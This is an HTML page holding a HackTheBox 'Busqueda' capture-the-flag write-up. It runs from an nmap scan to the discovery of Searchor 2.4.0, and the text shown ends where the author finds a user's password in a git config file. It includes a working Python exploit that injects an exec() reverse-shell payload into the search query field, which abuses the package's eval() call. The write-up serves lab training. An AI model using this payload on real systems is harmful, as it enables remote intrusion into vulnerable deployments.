<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>HackTheBox - Busqueda Writeup - SHAFIQAIMAN</title><meta name="Description" content="shafiqaiman.com is a cybersecurity/ethical hacking website that focus on publishing of writeup in HacktheBox, Tryhackme and other online CTF (capture the flag) challenge."><meta property="og:title" content="HackTheBox - Busqueda Writeup" />
<meta property="og:description" content="Nmap Like always, I’m going to scan the IP Address by using nmap but I’m going to scan the full port first. Then, I’m going to scan the only open ports.
1 2 3 4 5 6 7 8 9 10 11 12 nmap -p22,80 -sCV -oN nmap/busqueda 10.10.11.208 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA) |_ 256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519) 80/tcp open http Apache httpd 2." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://shafiqaiman.com/posts/htb/busqueda/" /><meta property="og:image" content="https://shafiqaiman.com/posts/htb/busqueda/featured.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-07-08T00:00:00+00:00" />
<meta property="article:modified_time" content="2023-07-08T00:00:00+00:00" /><meta property="og:site_name" content="SHAFIQAIMAN" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://shafiqaiman.com/posts/htb/busqueda/featured.png"/>
<meta name="twitter:title" content="HackTheBox - Busqueda Writeup"/>
<meta name="twitter:description" content="Nmap Like always, I’m going to scan the IP Address by using nmap but I’m going to scan the full port first. Then, I’m going to scan the only open ports.
1 2 3 4 5 6 7 8 9 10 11 12 nmap -p22,80 -sCV -oN nmap/busqueda 10.10.11.208 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA) |_ 256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519) 80/tcp open http Apache httpd 2."/>
<meta name="application-name" content="SHAFIQAIMAN">
<meta name="apple-mobile-web-app-title" content="SHAFIQAIMAN"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://shafiqaiman.com/posts/htb/busqueda/" /><link rel="prev" href="https://shafiqaiman.com/posts/htb/sense/" /><link rel="next" href="https://shafiqaiman.com/posts/htb/monitorstwo/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "HackTheBox - Busqueda Writeup",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/shafiqaiman.com\/posts\/htb\/busqueda\/"
        },"image": [{
                            "@type": "ImageObject",
                            "url": "https:\/\/shafiqaiman.com\/posts\/htb\/busqueda\/featured.png",
                            "width":  1400 ,
                            "height":  1060 
                        }],"genre": "posts","keywords": "python, mysql, gitea, rce, searchor 2.4.0, docker, docker-inspect","wordcount":  1119 ,
        "url": "https:\/\/shafiqaiman.com\/posts\/htb\/busqueda\/","datePublished": "2023-07-08T00:00:00+00:00","dateModified": "2023-07-08T00:00:00+00:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "SH∆FIQ ∆IM∆N"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="SHAFIQAIMAN">SH∆FIQ∆IM∆N</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/" title="Posts"><i class="fa-solid fa-book"></i>  </a><a class="menu-item" href="/tags/" title="Tags"><i class="fa-solid fa-tags"></i>  </a><a class="menu-item" href="/categories/" title="Categories"><i class="fa-solid fa-folder"></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="SHAFIQAIMAN">SH∆FIQ∆IM∆N</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/posts/" title="Posts"><i class="fa-solid fa-book"></i></a><a class="menu-item" href="/tags/" title="Tags"><i class="fa-solid fa-tags"></i></a><a class="menu-item" href="/categories/" title="Categories"><i class="fa-solid fa-folder"></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content always-active" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HackTheBox - Busqueda Writeup</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://shafiqaiman.com" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>SH∆FIQ ∆IM∆N</a></span>&nbsp;<span class="post-category">included in <a href="/categories/hackthebox/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>HacktheBox</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="08-07-2023">08-07-2023</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1119 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;6 minutes&nbsp;</div>
        </div><div class="featured-image"><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/htb/busqueda/featured.png"
        data-srcset="/posts/htb/busqueda/featured.png, /posts/htb/busqueda/featured.png 1.5x, /posts/htb/busqueda/featured.png 2x"
        data-sizes="auto"
        alt="/posts/htb/busqueda/featured.png"
        title="/posts/htb/busqueda/featured.png" /></div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#nmap">Nmap</a></li>
    <li><a href="#http-searcherhtb">Http: searcher.htb</a></li>
    <li><a href="#foothold-searchor-240">Foothold: Searchor 2.4.0</a></li>
    <li><a href="#shell-svc">Shell: svc</a></li>
    <li><a href="#http-giteasearcherhtb-cody">Http: gitea.searcher.htb (cody)</a></li>
    <li><a href="#ssh-svc">SSH: svc</a>
      <ul>
        <li><a href="#ssh-system-checkuppy-help">SSH: system-checkup.py help</a></li>
        <li><a href="#ssh-system-checkuppy-docker-ps">SSH: system-checkup.py docker-ps</a></li>
        <li><a href="#ssh-system-checkuppy-docker-inspect">SSH: system-checkup.py docker-inspect</a></li>
        <li><a href="#ssh-mysql">SSH: mysql</a></li>
      </ul>
    </li>
    <li><a href="#http-giteasearcherhtb-administrator">Http: gitea.searcher.htb (administrator)</a>
      <ul>
        <li><a href="#http-giteasearcherhtb-full-checkupsh">Http: gitea.searcher.htb (full-checkup.sh)</a></li>
        <li><a href="#http-giteasearcherhtb-system-chekuppy">Http: gitea.searcher.htb (system-chekup.py)</a></li>
      </ul>
    </li>
    <li><a href="#privesc-system-checkuppy">PrivEsc: system-checkup.py</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h2 id="nmap">Nmap</h2>
<p>Like always, I’m going to scan the IP Address by using <a href="https://nmap.org/" target="_blank" rel="noopener noreffer ">nmap</a> but I’m going to scan the full port first. Then, I’m going to scan the only open ports.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p22</span><span class="p">,</span><span class="mi">80</span><span class="w"> </span><span class="o">-</span><span class="n">sCV</span><span class="w"> </span><span class="o">-</span><span class="k">oN</span><span class="w"> </span><span class="n">nmap</span><span class="o">/</span><span class="n">busqueda</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">11</span><span class="p">.</span><span class="mi">208</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">PORT</span><span class="w">   </span><span class="k">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w"> </span><span class="k">VERSION</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">22</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">ssh</span><span class="w">     </span><span class="n">OpenSSH</span><span class="w"> </span><span class="mi">8</span><span class="p">.</span><span class="mi">9</span><span class="n">p1</span><span class="w"> </span><span class="n">Ubuntu</span><span class="w"> </span><span class="mi">3</span><span class="n">ubuntu0</span><span class="p">.</span><span class="mi">1</span><span class="w"> </span><span class="p">(</span><span class="n">Ubuntu</span><span class="w"> </span><span class="n">Linux</span><span class="p">;</span><span class="w"> </span><span class="n">protocol</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">0</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="mi">256</span><span class="w"> </span><span class="mi">4</span><span class="n">f</span><span class="p">:</span><span class="n">e3</span><span class="p">:</span><span class="n">a6</span><span class="p">:</span><span class="mi">67</span><span class="p">:</span><span class="n">a2</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="n">f9</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="mi">8</span><span class="n">d</span><span class="p">:</span><span class="n">c3</span><span class="p">:</span><span class="mi">0</span><span class="n">e</span><span class="p">:</span><span class="n">d7</span><span class="p">:</span><span class="mi">73</span><span class="p">:</span><span class="n">a0</span><span class="p">:</span><span class="mi">2</span><span class="k">c</span><span class="p">:</span><span class="mi">28</span><span class="w"> </span><span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="mi">256</span><span class="w"> </span><span class="mi">81</span><span class="p">:</span><span class="mi">6</span><span class="n">e</span><span class="p">:</span><span class="mi">78</span><span class="p">:</span><span class="mi">76</span><span class="p">:</span><span class="mi">6</span><span class="n">b</span><span class="p">:</span><span class="mi">8</span><span class="n">a</span><span class="p">:</span><span class="n">ea</span><span class="p">:</span><span class="mi">7</span><span class="n">d</span><span class="p">:</span><span class="mi">1</span><span class="n">b</span><span class="p">:</span><span class="n">ab</span><span class="p">:</span><span class="n">d4</span><span class="p">:</span><span class="mi">36</span><span class="p">:</span><span class="n">b7</span><span class="p">:</span><span class="n">f8</span><span class="p">:</span><span class="n">ec</span><span class="p">:</span><span class="n">c4</span><span class="w"> </span><span class="p">(</span><span class="n">ED25519</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">80</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">http</span><span class="w">    </span><span class="n">Apache</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">52</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span><span class="w"> </span><span class="n">Apache</span><span class="o">/</span><span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">52</span><span class="w"> </span><span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span><span class="w"> </span><span class="n">Did</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="n">follow</span><span class="w"> </span><span class="n">redirect</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">searcher</span><span class="p">.</span><span class="n">htb</span><span class="o">/</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Service</span><span class="w"> </span><span class="n">Info</span><span class="p">:</span><span class="w"> </span><span class="k">Host</span><span class="p">:</span><span class="w"> </span><span class="n">searcher</span><span class="p">.</span><span class="n">htb</span><span class="p">;</span><span class="w"> </span><span class="n">OS</span><span class="p">:</span><span class="w"> </span><span class="n">Linux</span><span class="p">;</span><span class="w"> </span><span class="n">CPE</span><span class="p">:</span><span class="w"> </span><span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>The nmap scan result is completed. There are just <code>two</code> port opens which are <code>SSH, HTTP</code>.  Well, I&rsquo;m going to ignore <code>port 22</code> which is <code>SSH</code>, since I don&rsquo;t have any credentials.</p>
<p>On top of that, nmap also found the <code>hostname</code> called <code>searcher.htb</code> and I&rsquo;m going to add that to the <code>/etc/hosts</code> file.</p>
<p><figure><a class="lightgallery" href="/posts/htb/busqueda/etc-hosts-1.png" title="add hostname in /etc/hosts" data-thumbnail="/posts/htb/busqueda/etc-hosts-1.png" data-sub-html="<h2>add hostname in /etc/hosts</h2><p>add hostname in /etc/hosts</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/posts/htb/busqueda/etc-hosts-1.png"
            data-srcset="/posts/htb/busqueda/etc-hosts-1.png, /posts/htb/busqueda/etc-hosts-1.png 1.5x, /posts/htb/busqueda/etc-hosts-1.png 2x"
            data-sizes="auto"
            alt="/posts/htb/busqueda/etc-hosts-1.png" width="329" height="98" />
    </a><figcaption class="image-caption">add hostname in /etc/hosts</figcaption>
    </figure></p>
<h2 id="http-searcherhtb">Http: searcher.htb</h2>
<p>With that information in hand. I&rsquo;ve navigated to <code>port 80</code> through my browser and I&rsquo;ve been greeted with this page. It&rsquo;s a simple web application with a dropdown of <code>search engine</code> and an input prompt.</p>
<p><figure><a class="lightgallery" href="/posts/htb/busqueda/searcher-index-page.png" title="searcher webpage" data-thumbnail="/posts/htb/busqueda/searcher-index-page.png" data-sub-html="<h2>searcher webpage</h2><p>searcher webpage</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/posts/htb/busqueda/searcher-index-page.png"
            data-srcset="/posts/htb/busqueda/searcher-index-page.png, /posts/htb/busqueda/searcher-index-page.png 1.5x, /posts/htb/busqueda/searcher-index-page.png 2x"
            data-sizes="auto"
            alt="/posts/htb/busqueda/searcher-index-page.png" width="992" height="764" />
    </a><figcaption class="image-caption">searcher webpage</figcaption>
    </figure></p>
<p>At the bottom of this page. It shows the application name and the build version, which is <code>Searchor 2.4.0</code> and it&rsquo;s linking into this <a href="https://github.com/ArjunSharda/Searchor" target="_blank" rel="noopener noreffer ">github</a> repository.</p>
<p><figure><a class="lightgallery" href="/posts/htb/busqueda/searcher-index-footer-page.png" title="searchor version" data-thumbnail="/posts/htb/busqueda/searcher-index-footer-page.png" data-sub-html="<h2>searchor version</h2><p>searchor version</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/posts/htb/busqueda/searcher-index-footer-page.png"
            data-srcset="/posts/htb/busqueda/searcher-index-footer-page.png, /posts/htb/busqueda/searcher-index-footer-page.png 1.5x, /posts/htb/busqueda/searcher-index-footer-page.png 2x"
            data-sizes="auto"
            alt="/posts/htb/busqueda/searcher-index-footer-page.png" width="591" height="197" />
    </a><figcaption class="image-caption">searchor version</figcaption>
    </figure></p>
<h2 id="foothold-searchor-240">Foothold: Searchor 2.4.0</h2>
<p>With a simple search on Google about this particular version. I came across this <a href="https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-/tree/main" target="_blank" rel="noopener noreffer ">github</a> repository which included the <code>POC</code>.</p>
<p>Below is the vulnerable code that leads this exploit to work. It&rsquo;s using the <code>eval</code> function and follow with <code>{engine}</code> and <code>{query}</code> as input.</p>
<p><figure><a class="lightgallery" href="/posts/htb/busqueda/github-code-vuln.png" title="vulnerable code in github" data-thumbnail="/posts/htb/busqueda/github-code-vuln.png" data-sub-html="<h2>vulnerable code in github</h2><p>vulnerable code in github</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/posts/htb/busqueda/github-code-vuln.png"
            data-srcset="/posts/htb/busqueda/github-code-vuln.png, /posts/htb/busqueda/github-code-vuln.png 1.5x, /posts/htb/busqueda/github-code-vuln.png 2x"
            data-sizes="auto"
            alt="/posts/htb/busqueda/github-code-vuln.png" width="779" height="363" />
    </a><figcaption class="image-caption">vulnerable code in github</figcaption>
    </figure></p>
<p>So, I make a simple exploit in python based on this <a href="https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-/tree/main" target="_blank" rel="noopener noreffer ">POC</a> by using <code>python reverse shell</code> as the payload.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env/python3</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Searchor 2.4.0 POC</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Description:</span>
</span></span><span class="line"><span class="cl"><span class="c1">#   https://github.com/ArjunSharda/Searchor/commit/29d5b1f28d29d6a282a5e860d456fab2df24a16b</span>
</span></span><span class="line"><span class="cl"><span class="c1">#   https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-/blob/main/README.md</span>
</span></span><span class="line"><span class="cl"><span class="c1">#   https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-/tree/main</span>
</span></span><span class="line"><span class="cl"><span class="c1">#   https://security.snyk.io/package/pip/searchor/2.4.0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="c1">#p = {&#39;http&#39;:&#39;http://127.0.0.1:8080&#39;, &#39;https&#39;:&#39;http://127.0.0.1:8080&#39;}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">send_req</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;&#39;, exec(</span><span class="se">\&#34;</span><span class="s2">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;</span><span class="si">{}</span><span class="s2">&#39;,</span><span class="si">{}</span><span class="s2">));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/sh&#39;,&#39;-i&#39;]);</span><span class="se">\&#34;</span><span class="s2">))#&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;engine&#39;</span><span class="p">:</span><span class="s1">&#39;Accuweather&#39;</span><span class="p">,</span><span class="s1">&#39;query&#39;</span><span class="p">:</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">#    requests.post(url, data=data, proxies=p)</span>
</span></span><span class="line"><span class="cl">    <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">ip</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">port</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] Usage: </span><span class="si">{}</span><span class="s2"> &lt;url&gt; &lt;attacker_ip&gt; &lt;attacker_port&gt;&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[-] Example: </span><span class="si">{}</span><span class="s1"> &#34;http://example.com/search&#34; &#34;10.10.10.10&#34; &#34;1111&#34;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[!] Sending the payload...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">send_req</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="shell-svc">Shell: svc</h2>
<p>Upon successfully executing the exploit. I&rsquo;m in as a <code>svc</code> user and the best thing to do is <a href="https://shafiq-aiman.gitbook.io/notes/misc/upgrade-reverse-shell" target="_blank" rel="noopener noreffer ">upgrade</a> my shell. On top of that, I&rsquo;m in the <code>/var/www/app</code> directory.</p>
<p><figure><a class="lightgallery" href="/posts/htb/busqueda/shell-as-svc.png" title="shell as svc" data-thumbnail="/posts/htb/busqueda/shell-as-svc.png" data-sub-html="<h2>shell as svc</h2><p>shell as svc</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/posts/htb/busqueda/shell-as-svc.png"
            data-srcset="/posts/htb/busqueda/shell-as-svc.png, /posts/htb/busqueda/shell-as-svc.png 1.5x, /posts/htb/busqueda/shell-as-svc.png 2x"
            data-sizes="auto"
            alt="/posts/htb/busqueda/shell-as-svc.png" width="490" height="266" />
    </a><figcaption class="image-caption">shell as svc</figcaption>
    </figure></p>
<p>While listing the <code>/var/www/app</code> directory. I found a hidden directory called <code>.git</code> and a <code>config</code> file in there.</p>
<p><figure><a class="lightgallery" href="/posts/htb/busqueda/list-of-git-dir.png" title="found config file in .git directory" data-thumbnail="/posts/htb/busqueda/list-of-git-dir.png" data-sub-html="<h2>found config file in .git directory</h2><p>found config file in .git directory</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/posts/htb/busqueda/list-of-git-dir.png"
            data-srcset="/posts/htb/busqueda/list-of-git-dir.png, /posts/htb/busqueda/list-of-git-dir.png 1.5x, /posts/htb/busqueda/list-of-git-dir.png 2x"
            data-sizes="auto"
            alt="/posts/htb/busqueda/list-of-git-dir.png" width="646" height="564" />
    </a><figcaption class="image-caption">found config file in .git directory</figcaption>
    </figure></p>
<p>The <code>config</code> file, it&rsquo;s contains the password of a user called <code>cody</code>  and a subdomain called <a href="https://about.gitea.com/" target="_blank" rel="noopener noreffer ">gitea</a>. So, I added that into my <code>/etc/hosts</code> file.</p>
<p><figure><a class="lightgallery" href="/posts/htb/busqueda/reading-config-file.png" title="found cody credentials" data-thumbnail="/posts/htb/busqueda/reading-config-file.png" data-sub-html="<h2>found cody credentials</h2><p>found cody credentials</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/posts/htb/busqueda/reading-config-file.png"
